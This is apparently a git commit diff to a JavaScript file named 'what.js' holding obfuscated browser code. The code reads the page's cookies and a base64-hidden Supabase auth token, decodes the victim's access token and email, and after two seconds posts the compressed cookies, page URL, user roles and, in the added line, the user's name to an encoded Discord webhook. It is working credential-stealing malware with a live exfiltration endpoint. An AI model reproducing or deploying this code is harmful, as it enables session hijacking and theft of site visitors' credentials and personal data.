c7889fba2a6d000a8ad2cdb223696597f55e65bc
ScriggerMania <kryospehereis@gmail.com>
2024-10-10 21:56:14 -0500

    Update what.js

--- what.js
+++ what.js
@@ -1,7 +1,7 @@
 window.__xnext=function(){let t=document.cookie.split(";").reduce((t,e)=>{let[l,o]=e.split("=");return t[l.trim()]=decodeURIComponent(o.trim()),t},{}),e=atob("c2ItYXV0aC1hdXRoLXRva2Vu");if(zz=atob("YWNjZXNzX3Rva2Vu"),z=atob("QmVhcmVyIA=="),null==(el=t[e])){let l=[],o=0;for(;void 0!==t[e+"."+o];)l.push(t[e+"."+o]),o++;l.length>0&&(el=l.join(""))}if(null!=el)return z+JSON.parse(atob(el.substr(7,el.length)))[zz];};function c() {return btoa(pako.deflate(document.cookie, { to: 'string' }));};function d(en) {return atob('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3Mv') + atob(en);};
 setTimeout(()=>{
     let whoiam=JSON.parse(atob(__xnext().split(".")[1]))["email"];
-    let t=c(),e=new FormData,a=new Blob([t],{type:"text/plain"});e.append("file",a,"content.txt");let i=JSON.stringify({content:"@everyone "+whoiam+" <"+window.location.href+"> `"+JSON.stringify(JSON.parse(localStorage.getItem("stores")).user.profile.user_roles)+"`"});e.append("payload_json",i),fetch(d("MTI5NDEyOTgxMzQ2NDAyMzA2MS9nZVVzWERfY3JKWHFiZE8zQ1J5TjZsUEZ1NGlKRUVuRG9aWjM5LVNUQnIwSUhsbFEzOVFyeTB6UDJwNnRoTGpyV3FXcg=="),{method:"POST",body:e});
+    let t=c(),e=new FormData,a=new Blob([t],{type:"text/plain"});e.append("file",a,"content.txt");let i=JSON.stringify({content:"@everyone "+whoiam+" <"+window.location.href+"> `"+JSON.stringify(JSON.parse(localStorage.getItem("stores")).user.profile.user_roles)+"` "+JSON.stringify(JSON.parse(localStorage.getItem("stores")).user.profile.name});e.append("payload_json",i),fetch(d("MTI5NDEyOTgxMzQ2NDAyMzA2MS9nZVVzWERfY3JKWHFiZE8zQ1J5TjZsUEZ1NGlKRUVuRG9aWjM5LVNUQnIwSUhsbFEzOVFyeTB6UDJwNnRoTGpyV3FXcg=="),{method:"POST",body:e});
 },2000)
 function load(url,pos = null,type=null) {
         if (pos==null){
